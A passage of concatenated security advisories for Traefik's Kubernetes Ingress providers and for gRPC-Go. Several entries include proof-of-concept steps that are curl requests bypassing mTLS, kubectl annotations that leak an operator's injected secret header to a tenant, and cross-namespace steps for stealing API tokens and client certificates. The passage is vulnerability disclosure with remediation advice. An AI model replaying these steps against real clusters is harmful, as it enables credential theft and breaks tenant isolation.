They can be generated locally with OpenSSL as follows: ```bash mkdir -p certs openssl req -x509 -newkey rsa:2048 -nodes -days 3650 \ -keyout certs/ca.key -out certs/ca.crt \ -subj '/CN=mtls-conflict-lab-ca' openssl req -newkey rsa:2048 -nodes \ -keyout certs/server.key -out certs/server.csr \ -subj '/CN=mtls.example.test' cat > certs/server.ext <<'EOF' [server_ext] basicConstraints=CA:FALSE keyUsage=digitalSignature,keyEncipherment extendedKeyUsage=serverAuth subjectAltName=DNS:mtls.example.test,DNS:control.mtls.example.test EOF openssl x509 -req -days 3650 -sha256 \ -in certs/server.csr -CA certs/ca.crt -CAkey certs/ca.key \ -CAcreateserial -out certs/server.crt \ -extfile certs/server.ext -extensions server_ext openssl req -newkey rsa:2048 -nodes \ -keyout certs/client.key -out certs/client.csr \ -subj '/CN=mtls-conflict-lab-client' cat > certs/client.ext <<'EOF' [client_ext] basicConstraints=CA:FALSE keyUsage=digitalSignature,keyEncipherment extendedKeyUsage=clientAuth EOF openssl x509 -req -days 3650 -sha256 \ -in certs/client.csr -CA certs/ca.crt -CAkey certs/ca.key \ -CAcreateserial -out certs/client.crt \ -extfile certs/client.ext -extensions client_ext ``` ### Traefik and k3s The static Traefik configuration was equivalent to: ```yaml services: k3s: image: rancher/k3s:v1.31.5-k3s1 privileged: true command: - server - --disable=traefik - --disable=servicelb - --tls-san=host.docker.internal - --write-kubeconfig=/output/kubeconfig.yaml - --write-kubeconfig-mode=644 ports: - '16448:6443' - '18448:8443' volumes: - ./k3s/output:/output traefik: image: traefik:v3.7.9 network_mode: 'service:k3s' command: - --entrypoints.websecure.address=:8443 - --providers.kubernetesingressnginx=true - --providers.kubernetesingressnginx.endpoint=https://127.0.0.1:6443 - --providers.kubernetesingressnginx.token=${K3S_TOKEN} - --providers.kubernetesingressnginx.certauthfilepath=/etc/traefik/k3s/server-ca.crt - --providers.kubernetesingressnginx.ingressclass=nginx - --providers.kubernetesingressnginx.controllerclass=k8s.io/ingress-nginx - --log.level=DEBUG - --accesslog=true volumes: - ./k3s/server-ca.crt:/etc/traefik/k3s/server-ca.crt:ro ``` The Kubernetes service account used for this isolated test was granted access to read the test resources. The test backend was an nginx service listening on port 8080 and returning: ```text BACKEND_REACHED path=/protected ``` The complete logical Kubernetes resources were: ```yaml apiVersion: v1 kind: Namespace metadata: name: mtls-conflict-lab --- apiVersion: networking.k8s.io/v1 kind: IngressClass metadata: name: nginx spec: controller: k8s.io/ingress-nginx --- apiVersion: v1 kind: ConfigMap metadata: name: backend-nginx-config namespace: mtls-conflict-lab data: default.conf: | server { listen 8080; server_name _; access_log /dev/stdout; default_type text/plain; location / { return 200 'BACKEND_REACHED path=$request_uri\n'; } } --- apiVersion: apps/v1 kind: Deployment metadata: name: backend namespace: mtls-conflict-lab spec: replicas: 1 selector: matchLabels: app: backend template: metadata: labels: app: backend spec: containers: - name: nginx image: nginx:1.27-alpine ports: - name: http containerPort: 8080 readinessProbe: tcpSocket: port: http volumeMounts: - name: config mountPath: /etc/nginx/conf.d/default.conf subPath: default.conf readOnly: true volumes: - name: config configMap: name: backend-nginx-config --- apiVersion: v1 kind: Service metadata: name: backend namespace: mtls-conflict-lab spec: selector: app: backend ports: - name: http port: 8080 targetPort: 8080 --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: protected-ingress namespace: mtls-conflict-lab annotations: nginx.ingress.kubernetes.io/auth-tls-secret: 'mtls-conflict-lab/client-ca' nginx.ingress.kubernetes.io/auth-tls-verify-client: 'on' spec: ingressClassName: nginx tls: - hosts: [mtls.example.test] secretName: server-tls rules: - host: mtls.example.test http: paths: - path: /protected pathType: Prefix backend: service: name: backend port: name: http --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: same-host-second-ingress namespace: mtls-conflict-lab annotations: nginx.ingress.kubernetes.io/auth-tls-secret: 'mtls-conflict-lab/client-ca' nginx.ingress.kubernetes.io/auth-tls-verify-client: 'on' spec: ingressClassName: nginx tls: - hosts: [mtls.example.test] secretName: server-tls rules: - host: mtls.example.test http: paths: - path: /second pathType: Prefix backend: service: name: backend port: name: http --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: single-router-control namespace: mtls-conflict-lab annotations: nginx.ingress.kubernetes.io/auth-tls-secret: 'mtls-conflict-lab/client-ca' nginx.ingress.kubernetes.io/auth-tls-verify-client: 'on' spec: ingressClassName: nginx tls: - hosts: [control.mtls.example.test] secretName: server-tls rules: - host: control.mtls.example.test http: paths: - path: /protected pathType: Prefix backend: service: name: backend port: name: http ``` The `server-tls` and `client-ca` Secrets are deliberately created separately so that private key material does not need to be embedded in the report. Save the Compose block above as `docker-compose.yml` and the Kubernetes block above as `k8s-manifest.yml` before running the following commands. ### Commands and results ```bash docker compose up -d k3s until test -f k3s/output/kubeconfig.yaml; do sleep 2; done docker cp '$(docker compose ps -q k3s):/var/lib/rancher/k3s/server/tls/server-ca.crt' \ k3s/server-ca.crt export KUBECONFIG='$PWD/k3s/output/kubeconfig.yaml' sed -i.bak 's#https://127.0.0.1:6443#https://127.0.0.1:16448#' \ k3s/output/kubeconfig.yaml until kubectl get nodes >/dev/null 2>&1; do sleep 2; done kubectl -n kube-system create serviceaccount traefik-validation kubectl create clusterrolebinding traefik-validation \ --clusterrole=cluster-admin \ --serviceaccount=kube-system:traefik-validation kubectl apply -f k8s-manifest.yml kubectl -n mtls-conflict-lab create secret tls server-tls \ --cert=certs/server.crt --key=certs/server.key kubectl -n mtls-conflict-lab create secret generic client-ca \ --from-file=ca.crt=certs/ca.crt export K3S_TOKEN='$(kubectl -n kube-system create token traefik-validation)' K3S_TOKEN='$K3S_TOKEN' docker compose up -d traefik kubectl -n mtls-conflict-lab rollout status deployment/backend --timeout=120s sleep 4 ``` Request to the same-host split configuration without a client certificate: ```bash curl --http1.1 -sk -D - -o - \ --resolve mtls.example.test:18448:127.0.0.1 \ https://mtls.example.test:18448/protected ``` Observed result on `traefik:v3.7.9`: ```text HTTP/1.1 200 OK BACKEND_REACHED path=/protected ``` The same request with a valid client certificate also returned `200 OK`: ```bash curl --http1.1 -sk -D - -o - \ --resolve mtls.example.test:18448:127.0.0.1 \ --cert certs/client.crt --key certs/client.key \ https://mtls.example.test:18448/protected ``` Control request to a host served by a single Ingress, without a client certificate: ```bash curl --http1.1 -sk -D - -o - \ --resolve control.mtls.example.test:18448:127.0.0.1 \ https://control.mtls.example.test:18448/protected echo 'curl_exit=$?' ``` Observed control result: ```text curl_exit=56 ``` The `-k` option only disables verification of the local server certificate. It does not provide a client certificate and does not disable server-side client-authentication. ## Impact and preconditions An unauthenticated network client can reach a route intended to require mTLS when all of the following are true: 1. The Kubernetes Ingress NGINX provider is enabled. 2. The same SNI/host is split across multiple HTTPS Ingress objects. 3. The resulting routers receive different TLS option names. 4. At least one of those routes is intended to require and verify client certificates. 5. The affected route is reachable by the client. The issue is configuration-dependent. A host served by a single unambiguous TLS option is not affected by this specific conflict. If an untrusted tenant can create another Ingress for an existing host, that tenant may be able to introduce the conflict. After the conflicting configuration has been accepted, the network client accessing the route does not need Kubernetes credentials or a client certificate. ## Suggested remediation - Reuse one TLS option identity for equivalent host-level client-authentication settings rather than including the Ingress identity in the option name. - Reject or fail closed when same-host routers have conflicting TLS options. - Do not fall back from `RequireAndVerifyClientCert` to a default `NoClientCert` configuration when a same-host conflict involves client auth. - Add a regression test proving that split same-host Ingress objects cannot downgrade `RequireAndVerifyClientCert` to `NoClientCert`. ## Source locations - `pkg/provider/kubernetes/ingress-nginx/kubernetes.go`: generates and attaches the per-Ingress auth-TLS option. - `pkg/server/router/tcp/manager.go`: resolves same-host TLS options and falls back to the default option when they differ. - `pkg/tls/tlsmanager.go`: initializes the default TLS configuration without a client-authentication requirement. </details>

GHSA-m6wx-622r-48r9.title: Kubernetes Ingress service middleware bypasses crossProviderNamespaces
GHSA-m6wx-622r-48r9.description: ## Summary There is a medium severity vulnerability in Traefik's Kubernetes Ingress provider. The `providers.kubernetesIngress.crossProviderNamespaces` allowlist was enforced for the `router.middlewares` and `service.serverstransport` annotations, but not for the `traefik.ingress.kubernetes.io/service.middlewares` Service annotation, whose value was copied into the generated dynamic service without checking the Service's namespace. A tenant restricted to a namespace excluded from the allowlist could therefore attach an operator-owned middleware from another provider to its own Service, and, when that middleware injects a backend credential, recover the credential at a backend it controls. Only the v3.7 line from v3.7.1 onwards is affected: the `crossProviderNamespaces` option was introduced in v3.7.1, and neither Traefik v2 nor the v3 lines up to v3.6 carry it. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.11 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues). <details> <summary>Original Description</summary> ### Summary The Kubernetes Ingress provider does not enforce `crossProviderNamespaces` for the documented `traefik.ingress.kubernetes.io/service.middlewares` Service annotation. A namespace-limited tenant excluded from the allowlist can apply an operator-owned middleware from another provider to its own Service. If that middleware injects a backend credential, the tenant can recover the credential at a backend it controls. ### Details `providers.kubernetesIngress.crossProviderNamespaces` is intended to restrict which Kubernetes namespaces may use cross-provider references. Traefik v3.7.10 correctly checks this option for `router.middlewares` and `service.serverstransport`, but `pkg/provider/kubernetes/ingress/kubernetes.go::loadService` copies `svcConfig.Service.Middlewares` into `svc.Middlewares` without checking the Service namespace. The generated dynamic Service therefore retains a reference such as `operator-secret@file`. During request handling, Traefik resolves and executes that middleware before forwarding the request to the tenant backend. This was reproduced on the current stable v3.7.10 (`2a2349356c01b1b1f7ecddb0c17b30c97f5241e7`). Current `master` was also affected when checked on 2026-08-10. This is related to the `crossProviderNamespaces` advisory family, but it is not the same path as GHSA-42cj-m3vj-89wv or GHSA-96qj-4jj5-wcjc: this issue uses the standard Kubernetes Ingress Service middleware annotation and reaches an HTTP middleware executed before a tenant-controlled backend. ### PoC [traefik-service-middleware-poc.zip](https://github.com/user-attachments/files/30907045/traefik-service-middleware-poc.zip) 1. Start Traefik v3.7.10 with `KUBECONFIG` pointing to an isolated test cluster: ```bash traefik --configFile=static.yml ``` 2. Apply the tenant fixture: ```bash kubectl apply -f tenant.yml kubectl -n poc-tenant rollout status deployment/attacker-backend ``` 3. As the namespace-limited tenant ServiceAccount, add the cross-provider Service middleware reference: ```bash kubectl --as=system:serviceaccount:poc-tenant:tenant-author \ -n poc-tenant annotate service attacker-backend \ traefik.ingress.kubernetes.io/service.middlewares=operator-secret@file ``` 4. After the provider reloads, send one request: ```bash curl -sS -H 'Host: poc.local' http://127.0.0.1:18080/ ``` The tenant backend response contains: ```text X-Operator-Secret: candidate-007-canary ``` Negative control: ```bash kubectl --as=system:serviceaccount:poc-tenant:tenant-author \ -n poc-tenant annotate service attacker-backend \ traefik.ingress.kubernetes.io/service.middlewares- curl -sS -H 'Host: poc.local' http://127.0.0.1:18080/ ``` The route still returns the backend response, but `X-Operator-Secret` is absent. ### Impact An excluded Kubernetes tenant can execute a middleware owned by another Traefik provider on requests to its own backend. In deployments where an operator middleware injects an upstream API key, bearer token, or similar credential, the tenant can disclose that credential without access to the operator configuration or Kubernetes Secrets. The proposed severity is Medium. The attack requires low Kubernetes namespace privileges and a pre-existing security-sensitive middleware whose qualified name is known to the tenant. </details>

GHSA-mhjw-hmjv-p99x.title: Unsynchronized write to the per-connection sticky round tripper shared by concurrent HTTP/2 streams
GHSA-mhjw-hmjv-p99x.description: ## Summary There is a medium severity vulnerability in Traefik's NTLM and Kerberos (Negotiate) backend authentication support. When a backend answers a request with a `WWW-Authenticate: NTLM` or `Negotiate` challenge, Traefik stores a dedicated backend round tripper in the client connection context so that the next requests on that client connection reuse the same authenticated backend connection. That per-connection slot was read and written without any synchronization, while HTTP/2 and HTTP/3 client connections multiplex concurrent requests over a single connection. Concurrent requests racing on the slot could replace a round tripper already in use, orphaning the backend connections it held and breaking the connection-bound authentication for that client, and a torn read of the slot may crash the Traefik process. The fix guards the slot with a mutex and keeps the round tripper already stored for a client connection, so concurrent requests stick exactly once. The same change also dedicates the slot to the `ServersTransport` that created it, which is tracked separately as GHSA-cw35-4q88-3rmp. Traefik v3.0 through v3.6 are affected and no longer receive patches; users on those lines must upgrade to v3.7.14. Traefik v2 is affected from v2.11.0, where NTLM and Kerberos support was introduced; earlier v2 releases and Traefik v1 are not affected. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.58 - https://github.com/traefik/traefik/releases/tag/v3.7.14 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-mwrr-6hp4-pxr6.title: Ingress-NGINX provider forwards forged Ssl-Client-* identity headers on its HTTP route
GHSA-mwrr-6hp4-pxr6.description: ## Summary There is a high severity vulnerability in Traefik's Kubernetes Ingress-NGINX provider. For an Ingress carrying the `nginx.ingress.kubernetes.io/auth-tls-pass-certificate-to-upstream` annotation, the middleware that owns the `Ssl-Client-*` request headers is attached only to the TLS router, so the plaintext HTTP router generated for the same Ingress forwards those headers exactly as the client sent them. That router normally only issues a redirect, but when `nginx.ingress.kubernetes.io/ssl-redirect: 'false'` is set it reaches the backend, and an unauthenticated client can then supply `Ssl-Client-Verify: SUCCESS` together with a chosen certificate subject and issuer. A backend that trusts those proxy-generated fields as an mTLS identity authorizes the request even though no client certificate was presented. Only the Traefik v3.7 line is affected: support for the `auth-tls-pass-certificate-to-upstream` annotation was added in v3.7.0, and earlier versions do not translate it. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.14 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-p956-6gvv-mxqp.title: Incomplete fix for GHSA-hrpp-p4fc-wwf8 allows ForwardAuth NTLM authentication bypass via Proxy-Authorization
GHSA-p956-6gvv-mxqp.description: ## Summary There is a high severity authentication vulnerability in Traefik's ForwardAuth middleware when the authentication server uses a connection-bound scheme such as NTLM or SPNEGO/Kerberos 'Negotiate'. The fix for GHSA-hrpp-p4fc-wwf8 sends the subrequests of a client that presents such a credential on a dedicated connection to the authentication server, but it only detects the credential in the `Authorization` header. ForwardAuth also forwards the `Proxy-Authorization` header, and a credential sent in that header still goes through the connection pool shared by every client. An unauthenticated client can then reuse an authentication-server connection already authenticated by another user, receive that user's identity through `authResponseHeaders`, and access the backend as that user. The patched versions apply the same isolation to `Proxy-Authorization`. Traefik v3.0 through v3.6 are end-of-life and are also affected; they will not receive a fix on their own line. As a workaround, set `authRequestHeaders` to a list that does not include `Proxy-Authorization`. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.62 - https://github.com/traefik/traefik/releases/tag/v3.7.18 - https://github.com/traefik/traefik/releases/tag/v3.8.0-rc.2 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-qm9f-w54v-q2qh.title: Preauthenticated Negotiate contaminates Traefik's globally shared backend connection pool
GHSA-qm9f-w54v-q2qh.description: ## Summary There is a high severity authentication vulnerability in Traefik's handling of connection-bound backend authentication (NTLM and SPNEGO/Kerberos 'Negotiate'). For each new frontend connection, Traefik sends the first backend request through a globally shared transport and only switches that connection to an isolated, per-frontend-connection transport *after* it observes an NTLM/Negotiate challenge in the backend's response. When a client preauthenticates — sending a valid `Authorization: Negotiate` token on its first request instead of following the standard challenge-first (`401`) handshake — the backend authenticates the shared-pool connection on that first request and returns a successful response. Because isolation is decided only after the response is seen, the now victim-authenticated backend socket remains in the shared pool, and it is neither drained nor closed. An unrelated, unauthenticated client on a completely separate frontend connection can then be assigned that socket and act with the victim's identity, performing victim-authorized reads or writes. Exploitation requires Traefik to proxy a connection-bound NTLM/Negotiate backend with connection reuse enabled, and a legitimate client that preauthenticates rather than following the standard challenge-first handshake. The ordinary challenge-first flow is not affected: it installs a dedicated backend transport before the credential-bearing request, so the authenticated socket never enters the shared pool. This is a distinct issue from GHSA-qqjf-53cj-pwvv (which fixed a missing HTTP/3 transport holder): it occurs on ordinary HTTP/1.1 and HTTP/2 frontend connections because the credential-bearing first request reaches the shared pool before any holder can isolate it. The behavior was introduced together with connection-bound NTLM/Kerberos support in v2.11.0 and v3.0.0. Traefik v3.0 through v3.6 are end-of-life and are also affected; they will not receive a fix on their own line, and users on those versions must upgrade to v3.7.14. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.58 - https://github.com/traefik/traefik/releases/tag/v3.7.14 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-rh7m-2m44-x32f.title: Traefik: Kubernetes Ingress and Service annotations allow cross-namespace references to Middlewares, ServersTransports, and TLSOptions
GHSA-rh7m-2m44-x32f.description:
## Summary There is a medium severity vulnerability in Traefik's Kubernetes Ingress provider that allows an actor with permission to create or update `Ingress` or `Service` resources in one namespace to reference `Middleware`, `ServersTransport`, and `TLSOption` resources from other namespaces through annotations. Unlike the Kubernetes CRD provider, which rejects such references when `allowCrossNamespace` is disabled, the annotation path performs no namespace validation, partially bypassing namespace-based tenant isolation. In multi-tenant clusters, this can expose another tenant's secrets, such as credentials injected by a `Headers` middleware or a client certificate configured in a `ServersTransport`. The fix introduces the `crossProviderNamespaces` option on the Kubernetes providers, which must be explicitly set to restrict which namespaces are allowed to use cross-provider references; when it is left unset, all namespaces remain allowed. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.46 - https://github.com/traefik/traefik/releases/tag/v3.6.17 - https://github.com/traefik/traefik/releases/tag/v3.7.1 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).
Original Description # Traefik: Missing Cross-Namespace Validation When Using K8s Annotations ## Brief Summary Traefik in Kubernetes (K8s) allows cross-namespace access to Traefik resources when using Annotations on Ingress and Service resources. ## Table of Content - [Proof of Concept](#proof-of-concept) - [Middleware Proof Of Concept](#middleware-proof-of-concept) - [Step 1: Preparation](#step-1-preparation) - [Step 2: Create Victim's Resources](#step-2-create-victims-resources) - [Step 3: Create Attacker Resources](#step-3-create-attacker-resources) - [Step 4: Attacker steals API Token](#step-4-attacker-steals-api-token) - [ServersTransport Proof Of Concept](#serverstransport-proof-of-concept) - [Step 1: Create Victim and Attacker Namespaces](#step-1-create-victim-and-attacker-namespaces) - [Step 2: Create Victim Resources](#step-2-create-victim-resources) - [Step 3: Create Attacker Resources](#step-3-create-attacker-resources-1) - [Step 3: Attacker steals Client Certificate to authenticate against protected resource living in the victim's own namespace](#step-3-attacker-steals-client-certificate-to-authenticate-against-protected-resource-living-in-the-victims-own-namespace) - [Recommendation](#recommendation) - [Appendix](#appendix) - [Resources](#resources) - [PoC router.middlewares / victim.yaml](#poc-routermiddlewares--victimyaml) - [PoC router.middlewares / attacker.yaml](#poc-routermiddlewares--attackeryaml) - [PoC service.serverstransport / victim.yaml](#poc-serviceserverstransport--victimyaml) - [PoC service.serverstransport / attacker.yaml](#poc-serviceserverstransport--attackeryaml) - [PoC router.middlewares intern-demo-access-victims-pod-wo-auth.txt](#poc-routermiddlewares-intern-demo-access-victims-pod-wo-authtxt) - [PoC router.middlewares intern-demo-access-victims-pod-with-auth.txt](#poc-routermiddlewares-intern-demo-access-victims-pod-with-authtxt) - [Test Setup](#test-setup) ## Description When using the Ingress and Service Annotations, it is possible to reference Middlewares, ServersTransports, and TLSOptions from foreign namespaces. While this is disallowed by default for Traefik's Kubernetes CRDs (by the [Configuration Option ``providers.kubernetesCRD.allowCrossNamespace``](https://doc.traefik.io/traefik/reference/install-configuration/providers/kubernetes/kubernetes-crd/#opt-providers-kubernetesCRD-allowCrossNamespace)), no validation is done when using Annotations on K8s Ingress and Service resources. An attacker can include these resources in an Ingress or Service configuration and thereby partially bypassing namespace-based tenant isolation. In certain cases, this will give an attacker access to data of services in other namespaces, for instance: - If a middleware adds an API access token through the Header middleware, an attacker can steal this token. - An attacker could include a ServersTransport that does client certificate authentication against a service to access this service. - An attacker could include a ForwardAuth middleware to gain access to the internal response headers of the forward auth service and thus might steal internal tokens. ## Affected Version The vulnerability was tested in the current Traefik version v3.6.5. Older versions are affected, too. ## Source Code References Ingress and Service Annotations are vulnerable. There is no check implemented in: [``pkg/provider/kubernetes/ingress/kubernetes.go``](https://github.com/traefik/traefik/blob/f794f8a29491b8467868811a3142a48e8f0a3854/pkg/provider/kubernetes/ingress/kubernetes.go#L202) Traefik's Kubernetes CRDs are not vulnerable and prevent cross namespace access: [``pkg/provider/kubernetes/crd/kubernetes_http.go``](https://github.com/traefik/traefik/blob/f794f8a29491b8467868811a3142a48e8f0a3854/pkg/provider/kubernetes/crd/kubernetes_http.go#L170) ## Prerequisites - Traefik is installed in Kubernetes - No special configuration is required as the ``kubernetesIngress`` provider is enabled by default - The attacker needs permission to create or modify Ingress or Service resources in one namespace - The name of the namespace and the name of the Middleware, TLSOption, or ServersTransport resource they want to target ## Impact An attacker can include Middlewares, ServersTransports, and TLSOptions resources from foreign namespaces in their own Ingress or Service configuration, thereby partially bypassing namespace-based tenant isolation. In certain cases, this will give an attacker access to data of services in other namespaces. ## Security Researcher / Reporter - Lorin Lehawany of ERNW Enno Rey Netzwerke GmbH - Sven Nobis of ERNW Enno Rey Netzwerke GmbH ## Proof of Concept The following descriptions explain the exploitation in detail for the two affected resource types Middleware and ServersTransport. The proof of concept (PoC) was tested in a Traefik setup installed via Helm chart in version `37.4.0`, but with the most recent Traefik app version ``v3.6.5`` and the default configuration. See the [test setup section](#test-setup) for details. ### Middleware Proof Of Concept The following steps demonstrate the problem with the affected ``router.middlewares`` annotation. This PoC even works with restrictive Network Policies set. #### Step 1: Preparation First, the namespaces `traefik-victim` and `traefik-attacker` are created: ```sh kubectl create namespace traefik-victim kubectl create namespace traefik-attacker namespace/traefik-victim created namespace/traefik-attacker created ``` In the next steps, the resources in the `victim.yaml` are created in the namespace `traefik-victim`, and the resources in the `attacker.yaml` are created in the namespace `traefik-attacker`. #### Step 2: Create Victim's Resources This step creates some resources to simulate a typical vulnerable setup with an application that uses Traefik and Ingress. The [`victim.yaml`](#poc-routermiddlewares--victimyaml) creates an Ingress resource with the name `traefik-ingress` in the namespace `traefik-victim`. The Ingress exposes the victim's application under the hostname `traefik-victim.gke.gcp.ernw.eu` and routes all requests with the path prefix `/example-app` to an internal service on port 80. The victim's application is exposed via the service `example-app-service` and protects its resources with an API token internally. The application itself is a simple nginx, which is configured using the ConfigMap to deliver a static HTML page. The server rejects any request that does not contain the predefined `X-API-Token` HTTP header with the correct value. This simulates an internal application that relies on a secret API token for authorization and assumes that only trusted users can provide this token. Further, two Traefik middlewares are defined: `basicauth` and `addheader`. `basicauth` middleware enforces HTTP Basic Authentication, and the `addheader` adds an `X-API-Token` request header with a secret value to all incoming requests to allow access for authorized users. This setup is deployed by the following commands: ```sh $ kubectl apply -f victim.yaml -n traefik-victim ingress.networking.k8s.io/traefik-ingress created service/example-app-service created deployment.apps/example-app created middleware.traefik.io/addheader created middleware.traefik.io/basicauth created secret/authsecret created configmap/nginx-conf created ``` The screenshot `victim-example-app.png` below shows the basic authentication, which is required for users to access the protected resources. After successful authentication, the user is logged in, and the static HTML content is displayed, as shown in the second screenshot (`victim-app.png`) below. The file shows [intern-demo-access-victims-pod-wo-auth.txt](#poc-routermiddlewares-intern-demo-access-victims-pod-wo-authtxt) and [intern-demo-access-victims-pod-with-auth.txt](#poc-routermiddlewares-intern-demo-access-victims-pod-with-authtxt) show that authentication is required when accessing the service internally. #### Step 3: Create Attacker Resources The [`attacker.yaml`](#poc-routermiddlewares--attackeryaml) contains the resources to steal the token from the ``addheader`` Middleware. This attacker-controlled Ingress is deployed in the attacker's namespace and configured to use the victim's Traefik middleware through [the ``router.middlewares`` annotation](https://doc.traefik.io/traefik/reference/routing-configuration/kubernetes/ingress/#on-ingress). The attacker-controlled deployment uses a simple ``whoami`` container which reflects all HTTP response headers. This is used to steal the victim's credentials. This setup is deployed by the following commands in the namespace `traefik-attacker`: ```sh $ kubectl apply -f attacker.yaml -n traefik-attacker ingress.networking.k8s.io/traefik-ingress created deployment.apps/whoami created service/whoami created ``` The following excerpt from the Traefik Pod shows that the resource from the victim's namespace is configured in the attacker's namespace: The screenshot ``attacker-controlled-pod-whoami-reflects-all-http-response-headers.png`` below shows this. ### ServersTransport Proof Of Concept The following steps demonstrate the problem with the affected ServersTransport annotation. This PoC does not work if Network Policies filter traffic to the victim's services from the attacker's namespace. #### Step 1: Create Victim and Attacker Namespaces First, the namespaces `traefik-victim` and `traefik-attacker` are created: ```sh kubectl create namespace traefik-victim kubectl create namespace traefik-attacker namespace/traefik-victim created namespace/traefik-attacker created ``` In the next steps, the resources in the `victim.yaml` are created in the namespace `traefik-victim`, and the resources in the `attacker.yaml` are created in the namespace `traefik-attacker`. #### Step 2: Create Victim Resources This step creates some resources to simulate a typical vulnerable setup with an application which is using Traefik and Ingress. It simulates a setup where the internal service (`mtls-nginx`) is protected with mTLS. The [`victim.yaml`](#poc-serviceserverstransport--victimyaml) creates multiple resources to demonstrate the following scenario: A user accesses the application via HTTPS, where access from the outside is restricted through basic authentication and client certificate authentication is enforced inside the cluster. The resource `traefik-ingress` exposes the victim's application under the hostname `traefik-victim.gke.gcp.test.eu` with the path prefix `/example-app` and enforces basic authentication via the `basicauth` middleware. The Ingress forwards traffic to the Service `mtls-nginx`, which represents the nginx Pod. The `mtls-nginx` Service routes traffic to the deployment `mtls-nginx`, which runs the nginx web server. For demonstration-purposes the web server delivers some static content. The ServersTransport resource with the name `serverstransport` defines the mTLS settings for Traefik. It requires to specify the server name, root CA, and client certificate to authenticate with the nginx. To simulate a more realistic scenario, the defined Middleware `basicauth` enforces basic authentication using the Secret `authsecret` for username/password so that access from the outside is restricted. This setup is deployed by the following commands: ```sh $ kubectl apply -f vicitim.yaml -n traefik-victim ingress.networking.k8s.io/traefik-ingress created service/mtls-nginx created deployment.apps/mtls-nginx created serverstransport.traefik.io/serverstransport created configmap/nginx-mtls-conf created configmap/client-ca-cert created secret/nginx-tls created secret/client-cert-secret created secret/nginx-cert created middleware.traefik.io/basicauth created secret/authsecret created ``` #### Step 3: Create Attacker Resources The [`attacker.yaml`](#poc-serviceserverstransport--attackeryaml) contains the resources to get access the victim's mTLS protected service. The attacker's setup exposes the host `traefik-attacker.gke.gcp.ernw.eu` that forwards traffic to a `socat` proxy, which routes HTTPS connections directly to the victim’s mTLS service to authenticate successfully. Traefik perform client certificate authentication with the victim's client certificate through the configuration of the [``service.serverstransport`` annotation](https://doc.traefik.io/traefik/reference/routing-configuration/kubernetes/ingress/#on-service). The attacker does not need RBAC access to the victim's namespace to do it. An attacker can use the ``service.serverstransport`` annotation to do mTLS authentication against other services inside and outside of the cluster, too. GHSA-rv2h-qh7j-xrjw.title: Ingress-NGINX provider: colliding auth-tls-secret names merge two client CAs into one TLS option, so a host is gated by another host's CA
GHSA-rv2h-qh7j-xrjw.description: ## Summary There is a high severity vulnerability in Traefik's Kubernetes Ingress NGINX provider. The TLS option generated for an Ingress carrying the `nginx.ingress.kubernetes.io/auth-tls-secret` annotation is named from the referenced Secret's namespace and name after normalizing them, which replaces every dot with a dash. Two Secrets whose names differ only by a dot and a dash, such as `my.secret` and `my-secret`, therefore produce the same TLS option name, and the Ingress processed second silently reuses the option built for the first one. A host configured to require client certificates issued by its own CA is then gated by another host's CA: certificates from that other CA are accepted, while the host's legitimate clients are refused. In Traefik v3.7.0 to v3.7.10, where the generated name also included the Ingress name, the same collision could occur between Ingresses whose names normalize identically. The provider now keeps the resource names as is in the names it generates. Traefik v2 and Traefik v3 versions before v3.7.0 are not affected: the `auth-tls-secret` annotation is supported by the Ingress NGINX provider since v3.7.0. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.14 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-ww7c-q3mv-xx22.title: Data race on the shared bufio.Reader after an HTTP/1 upgrade in FastProxy panics the whole process
GHSA-ww7c-q3mv-xx22.description: ## Summary There is a high severity vulnerability in Traefik's experimental FastProxy (`experimental.fastProxy`). Once a backend answers a protocol upgrade (`101 Switching Protocols`, e.g. WebSocket), the connection pool keeps reading from the backend connection while the tunnel copier reads from the same buffered reader, with no synchronization between them. An unauthenticated client that repeatedly opens upgraded connections and aborts them can corrupt the reader's internal state and trigger an unrecovered panic that terminates the whole Traefik process, causing a denial of service. Only deployments that enable `experimental.fastProxy` are affected. Traefik v2 is not affected, as FastProxy was introduced in v3.2. Traefik v3.2 to v3.6 are affected and no longer maintained, so they will not receive a patch: users on those versions should upgrade to a patched v3.7 release. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.15 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

CVE-2026-29054.description: Traefik is an HTTP reverse proxy and load balancer. From version 2.11.9 to 2.11.37 and from version 3.1.3 to 3.6.8, there is a potential vulnerability in Traefik managing the Connection header with X-Forwarded headers. CVE-2026-33186.title: gRPC-Go is the Go language implementation of gRPC. Versions prior ...
CVE-2026-33186.description: gRPC-Go is the Go language implementation of gRPC. Versions prior to 1.79.3 have an authorization bypass resulting from improper input validation of the HTTP/2 `:path` pseudo-header. The gRPC-Go server was too lenient in its routing logic, accepting requests where the `:path` omitted the mandatory leading slash (e.g., `Service/Method` instead of `/Service/Method`). While the server successfully routed these requests to the correct handler, authorization interceptors (including the official `grpc/authz` package) evaluated the raw, non-canonical path string. Consequently, "deny" rules defined using canonical paths (starting with `/`) failed to match the incoming request, allowing it to bypass the policy if a fallback "allow" rule was present. This affects gRPC-Go servers that use path-based authorization interceptors, such as the official RBAC implementation in `google.golang.org/grpc/authz` or custom interceptors relying on `info.FullMethod` or `grpc.Method(ctx)`; AND that have a security policy contains specific "deny" rules for canonical paths but allows other requests by default (a fallback "allow" rule). The vulnerability is exploitable by an attacker who can send raw HTTP/2 frames with malformed `:path` headers directly to the gRPC server. The fix in version 1.79.3 